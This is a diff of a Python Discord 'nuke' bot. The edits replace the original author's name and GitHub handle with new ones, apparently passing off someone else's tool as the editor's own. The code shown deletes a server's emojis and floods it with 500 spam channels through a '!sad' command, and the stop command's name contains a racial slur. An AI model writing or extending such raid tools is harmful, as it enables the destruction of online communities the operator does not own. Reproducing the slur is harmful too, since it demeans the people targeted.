@@ -8,7 +8,7 @@ from pystyle import *
 
 os.system('cls')
 time.sleep(1)
-os.system("title Stanford ┃ By: AkiRatsuyo")
+os.system("title Stanford ┃ By: few")
 os.system('cls')
 time.sleep(1)
 token = (Write.Input(f"""
@@ -38,7 +38,7 @@ async def on_ready():
 ╔═╗┌┬┐┌─┐┌┐┌┌─┐┌─┐┬─┐┌┬┐
 ╚═╗ │ ├─┤│││├┤ │ │├┬┘ ││
 ╚═╝ ┴ ┴ ┴┘└┘└  └─┘┴└──┴┘
-Github: @byaki\nCurrent Discord: Ratsuyo#0001 | endAki#1337 \n
+Github: @bvllet\nCurrent Discord: few#0002 | This is my rel account#0001 \n
 ╔══Bot - {client.user}\n╚══► Connected
 ╔══Prefix\n╚══► " ! "
 ╔══Commands\n╚══► sad = Dropping The Nuke. | noniggercancerstopcommand = To stop the nuke + log-out.
@@ -74,7 +74,7 @@ async def sad(ctx): #~ start command / nuke
        print(Fore.GREEN + f"{emoji.name}[V] Was deleted succesfull.")
      except:
        print(Fore.RED + f"{emoji.name}[!] Has not been Deleted! (missing perms?)")
-    await guild.create_text_channel("github byaki")
+    await guild.create_text_channel("github is bvllet")
     amount = 500
     for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
